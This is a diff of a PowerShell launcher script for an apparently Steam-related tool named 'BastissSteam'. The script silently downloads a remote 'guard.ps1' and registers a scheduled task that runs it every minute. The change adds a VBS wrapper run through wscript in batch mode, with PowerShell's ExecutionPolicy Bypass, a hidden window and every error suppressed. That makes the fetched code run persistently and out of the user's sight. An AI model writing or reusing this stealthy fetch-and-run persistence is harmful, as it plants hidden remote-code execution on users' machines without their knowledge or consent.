@@ -153,9 +153,12 @@ try {
     $guardDst=Join-Path $env:LOCALAPPDATA "BastissSteam\guard.ps1"
     try { Invoke-WebRequest -Uri $guardSrc -OutFile $guardDst -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue } catch {}
     if (Test-Path $guardDst) {
-        $taskCmd="powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$guardDst`""
+        $guardVbs=Join-Path $env:LOCALAPPDATA "BastissSteam\guard_launch.vbs"
+        try { Set-Content -LiteralPath $guardVbs -Value "Set sh = CreateObject(`"WScript.Shell`")`r`nps = sh.ExpandEnvironmentStrings(`"%LOCALAPPDATA%\BastissSteam\guard.ps1`")`r`ncmd = `"powershell -NoProfile -ExecutionPolicy Bypass -File `" & Chr(34) & ps & Chr(34)`r`nsh.Run cmd, 0, False`r`n" -Encoding ASCII -ErrorAction SilentlyContinue } catch {}
+        $taskCmd="wscript.exe //B `"$guardVbs`""
         & schtasks.exe /Create /TN "BastissGuard" /TR "$taskCmd" /SC MINUTE /MO 1 /F *> $null
-        Start-Process powershell -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$guardDst`"") -ErrorAction SilentlyContinue | Out-Null
+        Start-Sleep -Milliseconds 500
+        try { if (-not (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match "guard\.ps1" })) { Start-Process wscript.exe -ArgumentList "//B `"$guardVbs`"" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null } } catch {}
     }
 } catch {}
 Start-Process -FilePath $EXE_PATH
